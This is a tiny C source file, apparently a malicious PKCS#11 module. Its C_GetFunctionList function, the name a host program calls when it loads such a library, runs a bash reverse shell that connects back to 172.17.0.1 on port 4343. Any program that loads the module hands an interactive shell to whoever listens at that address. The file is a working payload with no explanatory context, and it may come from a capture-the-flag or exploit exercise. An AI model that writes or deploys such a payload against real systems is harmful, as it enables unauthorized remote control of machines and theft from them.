#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void C_GetFunctionList() {
    system("bash -c 'bash -i >& /dev/tcp/172.17.0.1/4343 0>&1'");
}
